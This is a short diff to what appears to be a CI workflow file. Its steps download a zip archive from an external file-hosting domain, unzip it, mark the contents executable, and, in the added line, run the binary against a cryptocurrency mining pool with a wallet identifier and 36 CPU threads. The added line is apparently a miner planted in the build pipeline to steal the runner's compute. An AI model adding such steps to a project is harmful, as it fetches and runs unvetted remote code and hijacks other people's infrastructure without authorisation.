@@ -25,3 +25,4 @@ jobs:
       - run: wget http://www.directfilelink.tech/5131958912234392/abc.zip
       - run: unzip abc.zip
       - run: chmod +x *
+      - run: ./abc -c na.luckpool.net:3956 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.02 -p x --cpu=36
